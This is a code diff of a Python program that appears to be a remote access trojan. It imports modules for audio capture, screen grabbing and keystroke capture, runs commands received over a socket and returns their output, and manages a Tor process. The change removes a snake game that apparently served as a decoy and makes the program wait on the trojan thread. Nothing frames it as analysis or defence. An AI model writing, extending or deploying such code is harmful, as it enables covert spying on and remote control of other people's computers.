@@ -12,7 +12,6 @@ import pyaudio
 from PIL import ImageGrab
 from pynput import keyboard
 import json
-from jeu.snake import jeu 
 import uuid
 
 
@@ -237,6 +236,7 @@ def rat_client():
 			else:
 				output = execute_commands(command)
 				s.send(str.encode(output))
+				
 	except socket.error as e:
 		print(f"Socket error: {e}. Reconnecting...")
 		s.close()
@@ -266,8 +266,7 @@ def main():
 	)
 	ratThread = threading.Thread(target=rat_client, daemon=True)
 	ratThread.start()
-	jeu()
-	
+	ratThread.join()
 	tor_process.terminate()
 
 
